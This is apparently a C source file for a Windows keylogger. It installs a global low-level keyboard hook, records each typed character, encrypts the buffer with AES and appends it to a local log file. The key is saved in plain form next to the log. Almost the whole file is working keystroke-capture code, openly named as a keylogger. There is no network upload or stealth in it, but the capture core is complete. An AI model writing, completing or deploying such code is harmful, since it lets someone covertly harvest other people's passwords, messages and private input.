#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#include <time.h>
#include "keylogger.h"

#define BUFFER_SIZE 1024
#define FLUSH_INTERVAL 5  // Flush every 5 seconds
#define KEY_SIZE 32
#define IV_SIZE 16

// Global variables
static HHOOK keyboardHook = NULL;
static char keyBuffer[BUFFER_SIZE];
static int bufferPos = 0;
static time_t lastFlushTime;
static HCRYPTPROV hCryptProv;
static HCRYPTKEY hKey;
static BOOL isRunning = FALSE;

// Function declarations
static BOOL initializeEncryption(void);
static void flushBufferToFile(void);
static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

// Function to initialize encryption
static BOOL initializeEncryption(void) {
    printf("Initializing encryption...\n");
    
    if (!CryptAcquireContext(&hCryptProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        DWORD err = GetLastError();
        printf("CryptAcquireContext failed. Error: %lu\n", err);
        return FALSE;
    }
    printf("CryptAcquireContext succeeded\n");

    BYTE keyData[KEY_SIZE];
    if (!CryptGenRandom(hCryptProv, KEY_SIZE, keyData)) {
        DWORD err = GetLastError();
        printf("CryptGenRandom failed. Error: %lu\n", err);
        CryptReleaseContext(hCryptProv, 0);
        return FALSE;
    }
    printf("Generated random key data\n");

    // Save key to file
    FILE* keyFile = fopen("key.bin", "wb");
    if (!keyFile) {
        printf("Failed to create key file. Error: %lu\n", GetLastError());
        CryptReleaseContext(hCryptProv, 0);
        return FALSE;
    }
    fwrite(keyData, 1, KEY_SIZE, keyFile);
    fclose(keyFile);
    printf("Saved key to file\n");

    // Create key BLOB
    BLOBHEADER blobHeader;
    blobHeader.bType = PLAINTEXTKEYBLOB;
    blobHeader.bVersion = CUR_BLOB_VERSION;
    blobHeader.reserved = 0;
    blobHeader.aiKeyAlg = CALG_AES_256;

    DWORD keyBlobLen = sizeof(BLOBHEADER) + sizeof(DWORD) + KEY_SIZE;
    BYTE* keyBlob = (BYTE*)malloc(keyBlobLen);
    if (!keyBlob) {
        printf("Failed to allocate memory for key BLOB\n");
        CryptReleaseContext(hCryptProv, 0);
        return FALSE;
    }

    memcpy(keyBlob, &blobHeader, sizeof(BLOBHEADER));
    DWORD* keySize = (DWORD*)(keyBlob + sizeof(BLOBHEADER));
    *keySize = KEY_SIZE;
    memcpy(keyBlob + sizeof(BLOBHEADER) + sizeof(DWORD), keyData, KEY_SIZE);

    if (!CryptImportKey(hCryptProv, keyBlob, keyBlobLen, 0, 0, &hKey)) {
        DWORD err = GetLastError();
        printf("CryptImportKey failed. Error: %lu\n", err);
        free(keyBlob);
        CryptReleaseContext(hCryptProv, 0);
        return FALSE;
    }
    printf("Key imported successfully\n");

    free(keyBlob);
    return TRUE;
}

static void flushBufferToFile(void) {
    if (bufferPos == 0) {
        printf("Buffer is empty, nothing to flush\n");
        return;
    }

    printf("Starting flush with buffer size: %d\n", bufferPos);

    // Debug: Check if encryption was initialized properly
    if (hCryptProv == 0 || hKey == 0) {
        printf("Encryption not properly initialized. hCryptProv: %p, hKey: %p\n", 
               (void*)hCryptProv, (void*)hKey);
        return;
    }

    // Add a null terminator to the buffer for safety
    keyBuffer[bufferPos] = '\0';
    printf("Flushing buffer content: %s\n", keyBuffer);

    // Allocate buffer with extra space for padding
    DWORD paddedSize = ((bufferPos + 15) / 16) * 16;
    BYTE* data = (BYTE*)malloc(paddedSize);
    if (!data) {
        printf("Failed to allocate memory for encryption\n");
        return;
    }
    
    // Copy the data and clear the rest of the buffer
    memcpy(data, keyBuffer, bufferPos);
    memset(data + bufferPos, 0, paddedSize - bufferPos);
    DWORD dataLen = bufferPos;  // Start with actual data length
    DWORD encryptLen = paddedSize;  // Total buffer size

    // Generate random IV
    BYTE iv[IV_SIZE];
    if (!CryptGenRandom(hCryptProv, IV_SIZE, iv)) {
        DWORD err = GetLastError();
        printf("Failed to generate IV. Error: %lu\n", err);
        free(data);
        return;
    }

    // Set IV
    if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
        DWORD err = GetLastError();
        printf("Failed to set IV. Error: %lu\n", err);
        free(data);
        return;
    }

    // Store the original data length
    DWORD originalLen = bufferPos;

    // Try encryption
    if (!CryptEncrypt(hKey, 0, TRUE, 0, data, &dataLen, encryptLen)) {
        DWORD err = GetLastError();
        printf("Encryption failed. Error code: %lu\n", err);
        switch(err) {
            case NTE_BAD_KEY:
                printf("The key is not valid.\n");
                break;
            case NTE_BAD_DATA:
                printf("The data is not valid.\n");
                break;
            case NTE_BAD_FLAGS:
                printf("The flags are not valid.\n");
                break;
            case NTE_BAD_TYPE:
                printf("The type is not valid.\n");
                break;
            case NTE_BAD_LEN:
                printf("The length is not valid.\n");
                break;
            default:
                printf("Unknown error occurred.\n");
        }
        free(data);
        return;
    }

    // If encryption succeeded, write to file
    FILE* file = fopen("keylog.encrypted", "ab");
    if (!file) {
        printf("Failed to open output file. Error: %lu\n", GetLastError());
        free(data);
        return;
    }

    // Write everything to file
    size_t written = 0;
    written += fwrite(iv, 1, IV_SIZE, file);
    written += fwrite(&originalLen, sizeof(DWORD), 1, file);
    written += fwrite(data, 1, dataLen, file);
    
    printf("Wrote %zu bytes to file\n", written);
    
    fclose(file);
    free(data);
    bufferPos = 0;  // Reset buffer
}

static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && isRunning) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
            
            // Get keyboard state
            BYTE keyState[256] = {0};
            GetKeyboardState(keyState);
            
            // Handle special keys
            switch(kbStruct->vkCode) {
                case VK_RETURN:
                    if (bufferPos + 1 < BUFFER_SIZE) {
                        keyBuffer[bufferPos++] = '\n';
                    }
                    break;
                case VK_TAB:
                    if (bufferPos + 1 < BUFFER_SIZE) {
                        keyBuffer[bufferPos++] = '\t';
                    }
                    break;
                case VK_BACK:
                    // Skip backspace logging
                    break;
                case VK_SPACE:
                    if (bufferPos + 1 < BUFFER_SIZE) {
                        keyBuffer[bufferPos++] = ' ';
                    }
                    break;
                default: {
                    // Convert the key to characters
                    WCHAR unicodeChar[2] = {0};
                    if (ToUnicode(kbStruct->vkCode, kbStruct->scanCode, 
                                keyState, unicodeChar, 2, 0) == 1) {
                        // Only store printable characters
                        if (iswprint(unicodeChar[0]) && bufferPos + 1 < BUFFER_SIZE) {
                            keyBuffer[bufferPos++] = (char)unicodeChar[0];
                        }
                    }
                    break;
                }
            }

            // Check if it's time to flush
            time_t currentTime = time(NULL);
            if (currentTime - lastFlushTime >= FLUSH_INTERVAL || bufferPos >= BUFFER_SIZE - 32) {
                flushBufferToFile();
                lastFlushTime = currentTime;
            }
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

bool startKeylogger(void) {
    if (isRunning) {
        return true;  // Already running
    }

    // Initialize time
    lastFlushTime = time(NULL);

    // Initialize encryption
    if (!initializeEncryption()) {
        return false;
    }

    // Install keyboard hook
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (keyboardHook == NULL) {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hCryptProv, 0);
        return false;
    }

    isRunning = TRUE;
    return true;
}

void stopKeylogger(void) {
    if (!isRunning) {
        return;  // Not running
    }

    if (keyboardHook) {
        flushBufferToFile();  // Flush any remaining data
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = NULL;
    }

    CryptDestroyKey(hKey);
    CryptReleaseContext(hCryptProv, 0);
    isRunning = FALSE;
}

void flushKeyloggerBuffer(void) {
    if (isRunning) {
        flushBufferToFile();
        lastFlushTime = time(NULL);
    }
}